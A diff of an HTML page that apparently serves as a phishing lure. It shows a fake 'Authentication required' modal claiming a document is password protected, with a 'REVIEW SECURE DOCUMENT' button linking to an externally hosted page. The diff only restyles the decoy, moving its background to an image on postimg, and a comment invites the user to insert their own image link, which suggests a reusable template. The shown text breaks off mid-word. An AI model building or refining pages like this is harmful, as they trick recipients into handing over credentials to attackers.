@@ -17,18 +17,34 @@
     }
 
     body {
-      /* Use background image directly */
-      background-image: url('canva bg.png');
-      background-size: auto;
-      background-position: center;
-      background-repeat: no-repeat;
       display: flex;
       justify-content: center;
       align-items: center;
       padding: 2rem;
+      background-color: #f0f0f0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Background image via <img> for precision */
+    .bg-image {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .bg-image img {
+      display: block;
+      max-width: 100%;
+      height: auto;
     }
 
     .modal {
+      position: relative;
+      z-index: 1;
       background-color: white;
       max-width: 500px;
       width: 100%;
@@ -64,20 +80,40 @@
       background-color: #1a54d3;
     }
 
+    /* PRINT/PDF fallback — in case PDF tool breaks flexbox */
     @media print {
       body {
+        display: block;
         background: none;
+      }
+
+      .bg-image {
+        display: block;
+        position: relative;
+        transform: none;
+        top: auto;
+        left: auto;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+
+      .bg-image img {
+        max-width: 100%;
+        height: auto;
+      }
+
+      .modal {
+        margin: 0 auto;
       }
     }
   </style>
 </head>
 <body>
 
-  <div class="modal">
-    <h2>Authentication required</h2>
-    <p>This document is password protected. Please authenticate to view the document.</p>
-    <a href="https://webador.com/" class="review-btn" target="_blank">REVIEW SECURE DOCUMENT</a>
+  <!-- ✅ Replace src="" with your actual PostImage link -->
+  <div class="bg-image">
+    <img src="https://i.postimg.cc/QCPLCsx9/canva-bg.png" alt="Background" />
   </div>
 
-</body>
-</html>
+  <div class="modal">
+    <h2>Authenti
